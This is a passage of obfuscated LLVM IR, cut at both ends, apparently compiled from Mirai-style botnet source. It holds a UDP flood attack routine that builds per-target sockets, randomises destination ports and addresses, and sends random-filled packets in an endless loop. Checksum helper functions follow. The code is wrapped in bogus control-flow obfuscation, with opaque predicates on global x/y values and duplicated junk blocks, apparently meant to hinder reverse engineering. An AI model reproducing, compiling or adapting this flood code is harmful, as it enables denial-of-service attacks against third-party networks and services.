  %81 = or i1 %79, %80
  br i1 %81, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %73
  store i32 0, i32* %17, align 4
  %82 = load i32, i32* @x.41
  %83 = load i32, i32* @y.42
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %90

; <label>:90:                                     ; preds = %282, %originalBBpart24
  %91 = load i32, i32* %17, align 4
  %92 = load i8, i8* %13, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp slt i32 %91, %93
  br i1 %94, label %95, label %285

; <label>:95:                                     ; preds = %90
  %96 = load i32, i32* @x.41
  %97 = load i32, i32* @y.42
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %95
  %104 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %105 = load i8**, i8*** %18, align 8
  %106 = load i32, i32* %17, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i8*, i8** %105, i64 %107
  store i8* %104, i8** %108, align 8
  %109 = load i16, i16* %20, align 2
  %110 = zext i16 %109 to i32
  %111 = icmp eq i32 %110, 65535
  %112 = load i32, i32* @x.41
  %113 = load i32, i32* @y.42
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %111, label %120, label %145

; <label>:120:                                    ; preds = %originalBBpart28
  %121 = load i32, i32* @x.41
  %122 = load i32, i32* @y.42
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %120
  %129 = call i32 @rand_next()
  %130 = trunc i32 %129 to i16
  %131 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %132 = load i32, i32* %17, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %131, i64 %133
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i32 0, i32 0
  %136 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %135, i32 0, i32 1
  store i16 %130, i16* %136, align 2
  %137 = load i32, i32* @x.41
  %138 = load i32, i32* @y.42
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %154

; <label>:145:                                    ; preds = %originalBBpart28
  %146 = load i16, i16* %20, align 2
  %147 = call zeroext i16 @htons(i16 zeroext %146) #7
  %148 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %149 = load i32, i32* %17, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %148, i64 %150
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %151, i32 0, i32 0
  %153 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %152, i32 0, i32 1
  store i16 %147, i16* %153, align 2
  br label %154

; <label>:154:                                    ; preds = %145, %originalBBpart212
  %155 = load i32, i32* @x.41
  %156 = load i32, i32* @y.42
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %154
  %163 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %164 = load i32*, i32** %19, align 8
  %165 = load i32, i32* %17, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds i32, i32* %164, i64 %166
  store i32 %163, i32* %167, align 4
  %168 = icmp eq i32 %163, -1
  %169 = load i32, i32* @x.41
  %170 = load i32, i32* @y.42
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %168, label %177, label %178

; <label>:177:                                    ; preds = %originalBBpart216
  ret void

; <label>:178:                                    ; preds = %originalBBpart216
  %179 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 0
  store i16 2, i16* %179, align 4
  %180 = load i16, i16* %21, align 2
  %181 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %180, i16* %181, align 2
  %182 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %183 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %182, i32 0, i32 0
  store i32 0, i32* %183, align 4
  %184 = load i32*, i32** %19, align 8
  %185 = load i32, i32* %17, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds i32, i32* %184, i64 %186
  %188 = load i32, i32* %187, align 4
  %189 = bitcast %union.__CONST_SOCKADDR_ARG* %28 to %struct.sockaddr**
  %190 = bitcast %struct.sockaddr_in* %24 to %struct.sockaddr*
  store %struct.sockaddr* %190, %struct.sockaddr** %189, align 8
  %191 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %28, i32 0, i32 0
  %192 = load %struct.sockaddr*, %struct.sockaddr** %191, align 8
  %193 = call i32 @bind(i32 %188, %struct.sockaddr* %192, i32 16) #6
  %194 = icmp eq i32 %193, -1
  br i1 %194, label %195, label %196

; <label>:195:                                    ; preds = %178
  br label %196

; <label>:196:                                    ; preds = %195, %178
  %197 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %198 = load i32, i32* %17, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i64 %199
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %200, i32 0, i32 2
  %202 = load i8, i8* %201, align 4
  %203 = zext i8 %202 to i32
  %204 = icmp slt i32 %203, 32
  br i1 %204, label %205, label %247

; <label>:205:                                    ; preds = %196
  %206 = load i32, i32* @x.41
  %207 = load i32, i32* @y.42
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %205
  %214 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %215 = load i32, i32* %17, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %214, i64 %216
  %218 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %217, i32 0, i32 1
  %219 = load i32, i32* %218, align 4
  %220 = call i32 @ntohl(i32 %219) #7
  %221 = call i32 @rand_next()
  %222 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %223 = load i32, i32* %17, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %222, i64 %224
  %226 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %225, i32 0, i32 2
  %227 = load i8, i8* %226, align 4
  %228 = zext i8 %227 to i32
  %229 = lshr i32 %221, %228
  %230 = add i32 %220, %229
  %231 = call i32 @htonl(i32 %230) #7
  %232 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %233 = load i32, i32* %17, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %232, i64 %234
  %236 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %235, i32 0, i32 0
  %237 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %236, i32 0, i32 2
  %238 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %237, i32 0, i32 0
  store i32 %231, i32* %238, align 4
  %239 = load i32, i32* @x.41
  %240 = load i32, i32* @y.42
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBBpart231, label %originalBB18alteredBB

originalBBpart231:                                ; preds = %originalBB18
  br label %247

; <label>:247:                                    ; preds = %originalBBpart231, %196
  %248 = load i32, i32* @x.41
  %249 = load i32, i32* @y.42
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %247
  %256 = load i32*, i32** %19, align 8
  %257 = load i32, i32* %17, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds i32, i32* %256, i64 %258
  %260 = load i32, i32* %259, align 4
  %261 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %262 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %263 = load i32, i32* %17, align 4
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %262, i64 %264
  %266 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %265, i32 0, i32 0
  %267 = bitcast %struct.sockaddr_in* %266 to %struct.sockaddr*
  store %struct.sockaddr* %267, %struct.sockaddr** %261, align 8
  %268 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %269 = load %struct.sockaddr*, %struct.sockaddr** %268, align 8
  %270 = call i32 @connect(i32 %260, %struct.sockaddr* %269, i32 16)
  %271 = icmp eq i32 %270, -1
  %272 = load i32, i32* @x.41
  %273 = load i32, i32* @y.42
  %274 = sub i32 %272, 1
  %275 = mul i32 %272, %274
  %276 = urem i32 %275, 2
  %277 = icmp eq i32 %276, 0
  %278 = icmp slt i32 %273, 10
  %279 = or i1 %277, %278
  br i1 %279, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %271, label %280, label %281

; <label>:280:                                    ; preds = %originalBBpart235
  br label %281

; <label>:281:                                    ; preds = %280, %originalBBpart235
  br label %282

; <label>:282:                                    ; preds = %281
  %283 = load i32, i32* %17, align 4
  %284 = add nsw i32 %283, 1
  store i32 %284, i32* %17, align 4
  br label %90

; <label>:285:                                    ; preds = %90
  %286 = load i32, i32* @x.41
  %287 = load i32, i32* @y.42
  %288 = sub i32 %286, 1
  %289 = mul i32 %286, %288
  %290 = urem i32 %289, 2
  %291 = icmp eq i32 %290, 0
  %292 = icmp slt i32 %287, 10
  %293 = or i1 %291, %292
  br i1 %293, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %285
  %294 = load i32, i32* @x.41
  %295 = load i32, i32* @y.42
  %296 = sub i32 %294, 1
  %297 = mul i32 %294, %296
  %298 = urem i32 %297, 2
  %299 = icmp eq i32 %298, 0
  %300 = icmp slt i32 %295, 10
  %301 = or i1 %299, %300
  br i1 %301, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %302

; <label>:302:                                    ; preds = %333, %originalBBpart239
  store i32 0, i32* %17, align 4
  br label %303

; <label>:303:                                    ; preds = %330, %302
  %304 = load i32, i32* %17, align 4
  %305 = load i8, i8* %13, align 1
  %306 = zext i8 %305 to i32
  %307 = icmp slt i32 %304, %306
  br i1 %307, label %308, label %333

; <label>:308:                                    ; preds = %303
  %309 = load i8**, i8*** %18, align 8
  %310 = load i32, i32* %17, align 4
  %311 = sext i32 %310 to i64
  %312 = getelementptr inbounds i8*, i8** %309, i64 %311
  %313 = load i8*, i8** %312, align 8
  store i8* %313, i8** %30, align 8
  %314 = load i8, i8* %23, align 1
  %315 = icmp ne i8 %314, 0
  br i1 %315, label %316, label %320

; <label>:316:                                    ; preds = %308
  %317 = load i8*, i8** %30, align 8
  %318 = load i16, i16* %22, align 2
  %319 = zext i16 %318 to i32
  call void @rand_str(i8* %317, i32 %319)
  br label %320

; <label>:320:                                    ; preds = %316, %308
  %321 = load i32*, i32** %19, align 8
  %322 = load i32, i32* %17, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds i32, i32* %321, i64 %323
  %325 = load i32, i32* %324, align 4
  %326 = load i8*, i8** %30, align 8
  %327 = load i16, i16* %22, align 2
  %328 = zext i16 %327 to i64
  %329 = call i64 @send(i32 %325, i8* %326, i64 %328, i32 16384)
  br label %330

; <label>:330:                                    ; preds = %320
  %331 = load i32, i32* %17, align 4
  %332 = add nsw i32 %331, 1
  store i32 %332, i32* %17, align 4
  br label %303

; <label>:333:                                    ; preds = %303
  br label %302

originalBBalteredBB:                              ; preds = %originalBB, %4
  %334 = alloca i8, align 1
  %335 = alloca %struct.attack_target*, align 8
  %336 = alloca i8, align 1
  %337 = alloca %struct.attack_option*, align 8
  %338 = alloca i32, align 4
  %339 = alloca i8**, align 8
  %340 = alloca i32*, align 8
  %341 = alloca i16, align 2
  %342 = alloca i16, align 2
  %343 = alloca i16, align 2
  %344 = alloca i8, align 1
  %345 = alloca %struct.sockaddr_in, align 4
  %346 = alloca %struct.iphdr*, align 8
  %347 = alloca %struct.udphdr*, align 8
  %348 = alloca i8*, align 8
  %349 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %350 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %351 = alloca i8*, align 8
  store i8 %0, i8* %334, align 1
  store %struct.attack_target* %1, %struct.attack_target** %335, align 8
  store i8 %2, i8* %336, align 1
  store %struct.attack_option* %3, %struct.attack_option** %337, align 8
  %352 = load i8, i8* %334, align 1
  %353 = zext i8 %352 to i64
  %354 = call noalias i8* @calloc(i64 %353, i64 8) #6
  %355 = bitcast i8* %354 to i8**
  store i8** %355, i8*** %339, align 8
  %356 = load i8, i8* %334, align 1
  %357 = zext i8 %356 to i64
  %358 = call noalias i8* @calloc(i64 %357, i64 4) #6
  %359 = bitcast i8* %358 to i32*
  store i32* %359, i32** %340, align 8
  %360 = load i8, i8* %336, align 1
  %361 = load %struct.attack_option*, %struct.attack_option** %337, align 8
  %362 = call i32 @attack_get_opt_int(i8 zeroext %360, %struct.attack_option* %361, i8 zeroext 7, i32 65535)
  %363 = trunc i32 %362 to i16
  store i16 %363, i16* %341, align 2
  %364 = load i8, i8* %336, align 1
  %365 = load %struct.attack_option*, %struct.attack_option** %337, align 8
  %366 = call i32 @attack_get_opt_int(i8 zeroext %364, %struct.attack_option* %365, i8 zeroext 6, i32 65535)
  %367 = trunc i32 %366 to i16
  store i16 %367, i16* %342, align 2
  %368 = load i8, i8* %336, align 1
  %369 = load %struct.attack_option*, %struct.attack_option** %337, align 8
  %370 = call i32 @attack_get_opt_int(i8 zeroext %368, %struct.attack_option* %369, i8 zeroext 0, i32 512)
  %371 = trunc i32 %370 to i16
  store i16 %371, i16* %343, align 2
  %372 = load i8, i8* %336, align 1
  %373 = load %struct.attack_option*, %struct.attack_option** %337, align 8
  %374 = call i32 @attack_get_opt_int(i8 zeroext %372, %struct.attack_option* %373, i8 zeroext 1, i32 1)
  %375 = trunc i32 %374 to i8
  store i8 %375, i8* %344, align 1
  %376 = bitcast %struct.sockaddr_in* %345 to i8*
  call void @llvm.memset.p0i8.i64(i8* %376, i8 0, i64 16, i32 4, i1 false)
  %377 = load i16, i16* %342, align 2
  %378 = zext i16 %377 to i32
  %379 = icmp eq i32 %378, 65535
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %73
  store i32 0, i32* %17, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %95
  %380 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %381 = load i8**, i8*** %18, align 8
  %382 = load i32, i32* %17, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds i8*, i8** %381, i64 %383
  store i8* %380, i8** %384, align 8
  %385 = load i16, i16* %20, align 2
  %386 = zext i16 %385 to i32
  %387 = icmp eq i32 %386, 65535
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %120
  %388 = call i32 @rand_next()
  %389 = trunc i32 %388 to i16
  %390 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %391 = load i32, i32* %17, align 4
  %392 = sext i32 %391 to i64
  %393 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %390, i64 %392
  %394 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %393, i32 0, i32 0
  %395 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %394, i32 0, i32 1
  store i16 %389, i16* %395, align 2
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %154
  %396 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %397 = load i32*, i32** %19, align 8
  %398 = load i32, i32* %17, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds i32, i32* %397, i64 %399
  store i32 %396, i32* %400, align 4
  %401 = icmp eq i32 %396, -1
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %205
  %402 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %403 = load i32, i32* %17, align 4
  %404 = sext i32 %403 to i64
  %405 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %402, i64 %404
  %406 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %405, i32 0, i32 1
  %407 = load i32, i32* %406, align 4
  %408 = call i32 @ntohl(i32 %407) #7
  %409 = call i32 @rand_next()
  %410 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %411 = load i32, i32* %17, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %410, i64 %412
  %414 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %413, i32 0, i32 2
  %415 = load i8, i8* %414, align 4
  %416 = zext i8 %415 to i32
  %_ = sub i32 0, %409
  %gen = add i32 %_, %416
  %417 = lshr i32 %409, %416
  %_19 = sub i32 %408, %417
  %gen20 = mul i32 %_19, %417
  %_21 = shl i32 %408, %417
  %_22 = sub i32 0, %408
  %gen23 = add i32 %_22, %417
  %_24 = shl i32 %408, %417
  %_25 = shl i32 %408, %417
  %_26 = shl i32 %408, %417
  %_27 = sub i32 0, %408
  %gen28 = add i32 %_27, %417
  %418 = add i32 %408, %417
  %419 = call i32 @htonl(i32 %418) #7
  %420 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %421 = load i32, i32* %17, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %420, i64 %422
  %424 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %423, i32 0, i32 0
  %425 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %424, i32 0, i32 2
  %426 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %425, i32 0, i32 0
  store i32 %419, i32* %426, align 4
  br label %originalBB18

originalBB33alteredBB:                            ; preds = %originalBB33, %247
  %427 = load i32*, i32** %19, align 8
  %428 = load i32, i32* %17, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds i32, i32* %427, i64 %429
  %431 = load i32, i32* %430, align 4
  %432 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %433 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %434 = load i32, i32* %17, align 4
  %435 = sext i32 %434 to i64
  %436 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %433, i64 %435
  %437 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %436, i32 0, i32 0
  %438 = bitcast %struct.sockaddr_in* %437 to %struct.sockaddr*
  store %struct.sockaddr* %438, %struct.sockaddr** %432, align 8
  %439 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %440 = load %struct.sockaddr*, %struct.sockaddr** %439, align 8
  %441 = call i32 @connect(i32 %431, %struct.sockaddr* %440, i32 16)
  %442 = icmp eq i32 %441, -1
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %285
  br label %originalBB37
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %16, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %19

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  br label %16

; <label>:16:                                     ; preds = %9
  %17 = load i32, i32* %4, align 4
  %18 = sub i32 %17, 2
  store i32 %18, i32* %4, align 4
  br label %6

; <label>:19:                                     ; preds = %6
  %20 = load i32, i32* @x.43
  %21 = load i32, i32* @y.44
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, 1
  %30 = load i32, i32* @x.43
  %31 = load i32, i32* @y.44
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %29, label %38, label %45

; <label>:38:                                     ; preds = %originalBBpart2
  %39 = load i16*, i16** %3, align 8
  %40 = load i16, i16* %39, align 2
  %41 = trunc i16 %40 to i8
  %42 = sext i8 %41 to i64
  %43 = load i64, i64* %5, align 8
  %44 = add i64 %43, %42
  store i64 %44, i64* %5, align 8
  br label %45

; <label>:45:                                     ; preds = %38, %originalBBpart2
  %46 = load i64, i64* %5, align 8
  %47 = lshr i64 %46, 16
  %48 = load i64, i64* %5, align 8
  %49 = and i64 %48, 65535
  %50 = add i64 %47, %49
  store i64 %50, i64* %5, align 8
  %51 = load i64, i64* %5, align 8
  %52 = lshr i64 %51, 16
  %53 = load i64, i64* %5, align 8
  %54 = add i64 %53, %52
  store i64 %54, i64* %5, align 8
  %55 = load i64, i64* %5, align 8
  %56 = xor i64 %55, -1
  %57 = trunc i64 %56 to i16
  ret i16 %57

originalBBalteredBB:                              ; preds = %originalBB, %19
  %58 = load i32, i32* %4, align 4
  %59 = icmp eq i32 %58, 1
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = load i32, i32* @x.45
  %6 = load i32, i32* @y.46
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca %struct.iphdr*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i16, align 2
  %16 = alloca i32, align 4
  %17 = alloca i16*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %13, align 8
  store i8* %1, i8** %14, align 8
  store i16 %2, i16* %15, align 2
  store i32 %3, i32* %16, align 4
  %22 = load i8*, i8** %14, align 8
  %23 = bitcast i8* %22 to i16*
  store i16* %23, i16** %17, align 8
  %24 = load %struct.iphdr*, %struct.iphdr** %13, align 8
  %25 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %24, i32 0, i32 8
  %26 = load i32, i32* %25, align 4
  store i32 %26, i32* %18, align 4
  %27 = load %struct.iphdr*, %struct.iphdr** %13, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 9
  %29 = load i32, i32* %28, align 4
  store i32 %29, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %30 = load i32, i32* %16, align 4
  store i32 %30, i32* %21, align 4
  %31 = load i32, i32* @x.45
  %32 = load i32, i32* @y.46
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %39

; <label>:39:                                     ; preds = %originalBBpart212, %originalBBpart2
  %40 = load i32, i32* %16, align 4
  %41 = icmp sgt i32 %40, 1
  br i1 %41, label %42, label %68

; <label>:42:                                     ; preds = %39
  %43 = load i32, i32* @x.45
  %44 = load i32, i32* @y.46
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %42
  %51 = load i16*, i16** %17, align 8
  %52 = load i16, i16* %51, align 2
  %53 = zext i16 %52 to i32
  %54 = load i32, i32* %20, align 4
  %55 = add i32 %54, %53
  store i32 %55, i32* %20, align 4
  %56 = load i16*, i16** %17, align 8
  %57 = getelementptr inbounds i16, i16* %56, i32 1
  store i16* %57, i16** %17, align 8
  %58 = load i32, i32* %16, align 4
  %59 = sub nsw i32 %58, 2
  store i32 %59, i32* %16, align 4
  %60 = load i32, i32* @x.45
  %61 = load i32, i32* @y.46
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart212, label %originalBB1alteredBB

originalBBpart212:                                ; preds = %originalBB1
  br label %39

; <label>:68:                                     ; preds = %39
  %69 = load i32, i32* %16, align 4
  %70 = icmp eq i32 %69, 1
  br i1 %70, label %71, label %78

; <label>:71:                                     ; preds = %68
  %72 = load i16*, i16** %17, align 8
  %73 = bitcast i16* %72 to i8*
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  %76 = load i32, i32* %20, align 4
  %77 = add i32 %76, %75
  store i32 %77, i32* %20, align 4
  br label %78

; <label>:78:                                     ; preds = %71, %68
  %79 = load i32, i32* @x.45
  %80 = load i32, i32* @y.46
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %78
  %87 = load i32, i32* %18, align 4
  %88 = lshr i32 %87, 16
  %89 = and i32 %88, 65535
  %90 = load i32, i32* %20, align 4
  %91 = add i32 %90, %89
  store i32 %91, i32* %20, align 4
  %92 = load i32, i32* %18, align 4
  %93 = and i32 %92, 65535
  %94 = load i32, i32* %20, align 4
  %95 = add i32 %94, %93
  store i32 %95, i32* %20, align 4
  %96 = load i32, i32* %19, align 4
  %97 = lshr i32 %96, 16
  %98 = and i32 %97, 65535
  %99 = load i32, i32* %20, align 4
  %100 = add i32 %99, %98
  store i32 %100, i32* %20, align 4
  %101 = load i32, i32* %19, align 4
  %102 = and i32 %101, 65535
  %103 = load i32, i32* %20, align 4
  %104 = add i32 %103, %102
  store i32 %104, i32* %20, align 4
  %105 = load %struct.iphdr*, %struct.iphdr** %13, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i32 0, i32 6
  %107 = load i8, i8* %106, align 1
  %108 = zext i8 %107 to i16
  %109 = call zeroext i16 @htons(i16 zeroext %108) #7
  %110 = zext i16 %109 to i32
  %111 = load i32, i32* %20, align 4
  %112 = add i32 %111, %110
  store i32 %112, i32* %20, align 4
  %113 = load i16, i16* %15, align 2
  %114 = zext i16 %113 to i32
  %115 = load i32, i32* %20, align 4
